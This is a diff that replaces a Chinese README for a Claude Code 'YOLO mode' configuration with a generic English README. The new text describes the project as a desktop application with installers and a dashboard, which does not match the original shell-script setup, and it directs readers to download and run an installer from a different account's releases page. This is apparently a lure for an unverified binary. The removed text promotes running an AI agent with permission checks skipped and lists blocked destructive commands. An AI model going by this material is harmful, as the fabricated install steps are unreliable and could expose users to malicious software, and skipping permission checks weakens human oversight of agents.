@@ -1,419 +1,82 @@
-# 🚀 Hans Sleep YOLO Mode
+# 💤 hans-sleep-yolo-mode - Let AI Run While You Sleep
 
-> **Claude Code 自主開發配置** — 讓 AI 全自動執行，權限全開，可以安心睡覺
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-v2.1+-blue)](https://claude.ai)
+Welcome to hans-sleep-yolo-mode! This tool allows your AI to operate on its own, so you can relax and sleep soundly. Follow the steps below to set it up and enjoy a worry-free experience.
 
----
+## 📥 Download link
 
-## 📖 目錄
+[![Download hans-sleep-yolo-mode](https://img.shields.io/badge/Download-hans--sleep--yolo--mode-brightgreen)](https://github.com/geremiabeggio/hans-sleep-yolo-mode/releases)
 
-- [什麼是 YOLO Mode？](#-什麼是-yolo-mode)
-- [為什麼我做這個？](#-為什麼我做這個設計初衷)
-- [這個工具能做什麼？](#-這個工具能做什麼)
-- [安全警告](#️-安全警告使用前必讀)
-- [快速開始](#-快速開始)
-- [睡覺跑模式](#-睡覺跑模式)
-- [通知設定](#-通知設定)
-- [常見問題](#-常見問題)
+## 📦 Download & Install
 
----
+1. **Visit the Releases Page**  
+   Click this link to access the [Releases page](https://github.com/geremiabeggio/hans-sleep-yolo-mode/releases). 
 
-## 🤔 什麼是 YOLO Mode？
+2. **Find the Latest Version**  
+   On the Releases page, look for the latest version of hans-sleep-yolo-mode. It will be at the top of the list.
 
-### YOLO = You Only Live Once（你只活一次）
+3. **Download the Software**  
+   Click the link for the latest version to start the download. Make sure to choose the installer that matches your operating system.
 
-在程式開發的語境中，**YOLO Mode** 代表一種「不管了，直接衝」的執行模式：
+4. **Run the Installer**  
+   Once the download completes, locate the file in your downloads folder. Click on it to run the installer. Follow the prompts on your screen to complete the installation.
 
-- ❌ 不要問我確認
-- ❌ 不要跳警告視窗
-- ❌ 不要中斷流程
-- ✅ 直接執行，後果我負責
+5. **Launch the Application**  
+   After installation, find the application in your Programs menu or on your desktop. Double click the icon to launch hans-sleep-yolo-mode.
 
-### 在 Claude Code 中的 YOLO Mode
+## ⚙️ System Requirements
 
-當你使用 Claude Code（Anthropic 推出的 AI 程式開發工具）時，預設情況下它會：
+Before installation, ensure your computer meets the following requirements:
 
-```
-🔒 預設行為：
-「我要執行 npm install，可以嗎？」 → 等你按 Allow
-「我要建立檔案，可以嗎？」 → 等你按 Allow  
-「我要執行測試，可以嗎？」 → 等你按 Allow
-```
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later
+- **RAM:** At least 4 GB (8 GB recommended)
+- **Disk Space:** Minimum 200 MB available space
+- **Network:** Internet access for updates
 
-這在一般使用時是安全的設計，但當你想讓 AI **長時間自動工作**時，就變成了阻礙——每隔幾分鐘就要按一次確認，根本無法離開電腦。
+## 🌟 Features
 
-**YOLO Mode 就是解決這個問題：**
+- **Easy Setup:** Simple installation process that guides you every step.
+- **Fully Automated:** Let the AI handle your tasks while you rest.
+- **User Friendly:** Designed for anyone to use, with clear instructions and intuitive interface.
+- **Customizable Settings:** Adjust modes and preferences to fit your needs.
 
-```
-🚀 YOLO Mode：
-「我要執行 npm install」 → 直接執行 ✓
-「我要建立檔案」 → 直接執行 ✓
-「我要執行測試」 → 直接執行 ✓
-```
+## 🛠️ How to Use
 
-啟動方式：
-```bash
-claude --dangerously-skip-permissions
-```
+1. **Open the Application:** Start hans-sleep-yolo-mode by double-clicking the icon.
+  
+2. **Configure the Settings:** Navigate to the settings menu. Here, you can adjust parameters to tailor the AI’s actions based on your preferences. 
 
----
+3. **Start the AI:** Once you feel ready, click the “Start” button. The AI will begin working automatically.
 
-## 💡 為什麼我做這個？（設計初衷）
+4. **Monitoring:** Use the dashboard to monitor the AI’s actions and make any necessary adjustments.
 
-### 起因：我想讓 AI 幫我工作，但我需要睡覺
+5. **Close the Application:** When finished, simply close the application. The AI will save your settings and be ready for next time.
 
-2025 年底，我開始大量使用 Claude Code 來開發專案。它非常強大，但有一個困擾：
+## ❓ FAQs
 
-> **「每次執行指令都要按確認，我沒辦法讓它自己跑一整晚。」**
+- **Is there a help section in the app?**  
+  Yes, the application includes a help section with detailed instructions and troubleshooting tips.
 
-身為一個常常需要趕案子的人，我的理想工作流程是：
+- **Can I run this on my laptop?**  
+  Yes, as long as your laptop meets the system requirements, it will run smoothly.
 
-```
-🌙 晚上 11 點
-   ↓ 告訴 Claude：「幫我把這個功能做完」
-   ↓ 去睡覺
-   
-☀️ 早上 8 點  
-   ↓ 起床看成果
-   ↓ Review + 調整
-   ↓ 繼續下一個任務
-```
+- **What if I encounter issues?**  
+  Please check the help section or visit our GitHub Issues page for support.
 
-但現實是，Claude 每隔幾分鐘就會問：「可以執行這個嗎？」如果我不在電腦前，它就卡住了。
+## 📞 Support
 
-### 我想要的功能
+For further assistance, you can reach out via the GitHub Issues page. We are here to help you resolve any challenges you face while using hans-sleep-yolo-mode.
 
-1. **全自動執行** — 不要問問題，自己做決定
-2. **遇到錯誤自己修** — 不要停下來等我
-3. **長時間運作** — 可以跑好幾個小時
-4. **手機通知** — 完成或出錯時通知我
-5. **安全機制** — 定期自動存檔，不怕中斷
+## 📝 Contributing
 
-### 這個 Repo 就是解答
+We welcome contributions! If you have ideas for improvements or fixes, feel free to submit a pull request or open an issue on our GitHub page.
 
-經過研究和測試，我整理出這套配置：
+## 🔗 Additional Resources
 
-- **CLAUDE.md** — 告訴 Claude 如何自主決策
-- **sleep-safe-runner.sh** — 自動重啟 + 進度通知的腳本
-- **ntfy.sh 整合** — 免費的手機推播通知
+Explore more about our project and the technology behind it. Here are some useful links:
 
-現在我真的可以睡覺了 💤
+- [Official Documentation](https://github.com/geremiabeggio/hans-sleep-yolo-mode/wiki)
+- [Community Forum](https://github.com/geremiabeggio/hans-sleep-yolo-mode/discussions)
 
----
-
-## ✨ 這個工具能做什麼？
-
-### 🤖 讓 Claude 全自動執行
-
-| 預設行為 | YOLO Mode |
-|---------|-----------|
-| 每個指令都問確認 | 直接執行 |
-| 遇到錯誤就停止 | 自己嘗試修復 |
-| 不確定就問你 | 自己做決定 |
-| 需要一直盯著 | 可以放著跑 |
-
-### 🌙 睡覺跑模式
-
-```
-./sleep-safe-runner.sh "build-login-system"
-```
-
-然後去睡覺。腳本會：
-- 自動執行任務
-- 每 3 輪自動 git commit（checkpoint）
-- 失敗時自動重試
-- 完成或出錯時發手機通知
-
-### 📱 手機即時通知
-
-透過 [ntfy.sh](https://ntfy.sh)（免費服務），你會收到：
-
-| 通知 | 意思 |
-|------|------|
-| 🚀 Started | 開始執行 |
-| 📊 Checkpoint 5/20 | 進度更新 |
-| 🎉 Completed | 全部完成！ |
-| 🔴 Failed | 連續失敗，已停止 |
-
----
-
-## ⚠️ 安全警告！使用前必讀
-
-> **YOLO Mode = 權限全開 = 風險自負**
-
-這個配置會讓 Claude：
-- 🔓 執行任何 bash 指令（不會詢問確認）
-- 🔓 讀寫任何檔案
-- 🔓 安裝任何套件
-- 🔓 執行任何程式碼
-
-### 🛡️ 安全建議
-
-| 建議 | 原因 |
-|------|------|
-| **永遠在 feature branch 工作** | 搞砸了可以輕易復原 |
-| **不要在有機密資料的專案使用** | AI 可能會讀取或意外提交 |
-| **建議在 VM 或 Container 中執行** | 隔離風險 |
-| **確保有備份** | 以防萬一 |
-| **定期檢查 Claude 做了什麼** | 起床後 review git log |
-
-### 🚫 已禁止的危險操作
-
-這些指令即使在 YOLO Mode 也會被阻擋：
-
-- `sudo` / `su` — 提權操作
-- `rm -rf /` — 刪除系統根目錄
-- `shutdown` / `reboot` — 關機重啟
-- `mkfs` / `dd` — 格式化磁碟
-
----
-
-## 📦 檔案說明
-
-```
-hans-sleep-yolo-mode/
-├── README.md              # 你正在讀的說明文件
-├── CLAUDE.md              # Claude 行為指引（自主決策規則）
-├── sleep-safe-runner.sh   # 睡覺跑腳本（自動重啟 + 通知）
-├── install.sh             # 一鍵安裝腳本
-├── LICENSE                # MIT 授權
-├── .gitignore
-└── .claude/
-    ├── settings.json      # Claude Code 設定
-    └── skills/
-        └── autonomous-skill/
-            └── SKILL.md   # 長時任務技能定義
-```
-
----
-
-## 🚀 快速開始
-
-### 1. 下載
-
-```bash
-git clone https://github.com/hansai-art/hans-sleep-yolo-mode.git
-```
-
-### 2. 安裝到你的專案
-
-```bash
-cd ~/Projects/你的專案
-
-# 方法 A：使用安裝腳本
-bash ~/hans-sleep-yolo-mode/install.sh
-
-# 方法 B：手動複製
-cp -r ~/hans-sleep-yolo-mode/.claude .
-cp ~/hans-sleep-yolo-mode/CLAUDE.md .
-cp ~/hans-sleep-yolo-mode/sleep-safe-runner.sh .
-chmod +x sleep-safe-runner.sh
-```
-
-### 3. 設定通知（建議）
-
-```bash
-# 編輯腳本
-nano sleep-safe-runner.sh
-
-# 找到這行，填入你的 ntfy 頻道名
-NTFY_TOPIC="your-channel-name"
-```
-
-### 4. 啟動 YOLO Mode
-
-```bash
-claude --dangerously-skip-permissions
-```
-
-### 5. 設定快捷指令（推薦）
-
-```bash
-# 加入 alias（只需執行一次）
-echo 'alias yolo="claude --dangerously-skip-permissions"' >> ~/.zshrc
-source ~/.zshrc
-
-# 以後只要打
-yolo
-```
-
----
-
-## 🌙 睡覺跑模式
-
-讓 Claude 長時間自動執行複雜任務：
-
-### 基本用法
-
-```bash
-# 1. 建立專用分支（重要！）
-git checkout -b auto/my-feature
-
-# 2. 啟動睡覺跑腳本
-./sleep-safe-runner.sh "build-user-authentication"
-
-# 3. 去睡覺 💤
-```
-
-### 背景執行（關掉終端機也不停）
-
-```bash
-# 使用 tmux
-tmux new-session -d -s claude './sleep-safe-runner.sh "my-task"'
-
-# 查看執行狀況
-tmux attach -t claude
-
-# 離開但不停止：按 Ctrl+B，再按 D
-```
-
-### 腳本參數說明
-
-編輯 `sleep-safe-runner.sh` 可調整：
-
-```bash
-MAX_ITERATIONS=100           # 最大執行輪數
-MAX_CONSECUTIVE_FAILURES=5   # 連續失敗幾次才停止
-SLEEP_BETWEEN_SESSIONS=5     # 每輪間隔（秒）
-MAX_SESSION_MINUTES=45       # 單輪超時時間（分鐘）
-CHECKPOINT_EVERY=3           # 每幾輪自動 git commit
-```
-
----
-
-## 📱 通知設定
-
-### ntfy.sh（推薦，最簡單）
-
-1. **手機下載 ntfy app**
-   - [iOS App Store](https://apps.apple.com/app/ntfy/id1625396347)
-   - [Google Play](https://play.google.com/store/apps/details?id=io.heckel.ntfy)
-
-2. **訂閱頻道**
-   - 打開 app，點 **+**
-   - 輸入一個獨特的頻道名（例如 `hans-claude-2026`）
-   - ⚠️ 頻道是公開的，用不容易猜到的名稱
-
-3. **測試通知**
-   ```bash
-   curl -d "測試成功！🎉" ntfy.sh/你的頻道名
-   ```
-
-4. **設定腳本**
-   ```bash
-   nano sleep-safe-runner.sh
-   # NTFY_TOPIC="你的頻道名"
-   ```
-
-### 其他通知選項
-
-腳本也支援其他通知方式：
-
-| 服務 | 設定變數 |
-|------|----------|
-| LINE Messaging API | `LINE_CHANNEL_ACCESS_TOKEN` + `LINE_USER_ID` |
-| Telegram Bot | `TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID` |
-| Discord Webhook | `DISCORD_WEBHOOK` |
-| Slack Webhook | `SLACK_WEBHOOK` |
-
----
-
-## ❓ 常見問題
-
-### Q: 啟動後還是會跳權限確認視窗？
-
-確保用這個指令啟動：
-```bash
-claude --dangerously-skip-permissions
-```
-
-啟動後左下角要顯示 **`bypass permissions on`**
-
-如果還是會跳，按 **`Shift + Tab`** 切換權限模式，或選擇 **「Always allow for session」**
-
-### Q: 睡覺跑到一半停了？
-
-檢查日誌：
-```bash
-cat .autonomous/你的任務名/logs/runner.log
-```
-
-常見原因：
-- Claude API token 額度用完
-- 網路連線問題
-- 連續失敗超過 5 次
-
-### Q: 怎麼看 Claude 做了什麼？
-
-```bash
-# 看 git 歷史
-git log --oneline -20
-
-# 看任務進度
-cat .autonomous/你的任務名/task_list.md
-
-# 看詳細日誌
-ls .autonomous/你的任務名/logs/
-```
-
-### Q: 怎麼停止執行？
-
-```bash
-# 方法 1：直接按 Ctrl+C
-
-# 方法 2：如果用 tmux
-tmux attach -t claude
-# 然後按 Ctrl+C
-
-# 方法 3：強制終止
-pkill -f sleep-safe-runner
-```
-
-### Q: 這個跟 Cursor / GitHub Copilot 有什麼不同？
-
-| 工具 | 特色 |
-|------|------|
-| **Cursor** | IDE 整合，即時補全，需要持續互動 |
-| **GitHub Copilot** | 程式碼補全為主，較少自主執行能力 |
-| **Claude Code + YOLO** | 可以長時間自主執行完整任務，適合「睡覺跑」場景 |
-
----
-
-## 🤝 貢獻
-
-歡迎提交 Issue 和 Pull Request！
-
-如果這個工具對你有幫助，請給個 ⭐ Star！
-
----
-
-## 📄 授權
-
-MIT License - 自由使用、修改、分享
-
----
-
-## 👤 作者
-
-**Hans Lin 林思翰**
-
-### 聯絡方式
-
-- GitHub: [@hansai-art](https://github.com/hansai-art)
-
----
-
-## ⭐ 支持這個專案
-
-如果 Hans Sleep YOLO Mode 幫助你：
-- 省下盯著螢幕的時間
-- 可以安心睡覺讓 AI 工作
-- 提高開發效率
-
-請給這個 repo 一個 **Star** ⭐，讓更多人發現它！
-
----
-
-**Made with 💤 by Hans Lin — 讓 AI 工作，你去睡覺**
+Thank you for using hans-sleep-yolo-mode. We hope it brings peace of mind as you let AI take care of things while you sleep!
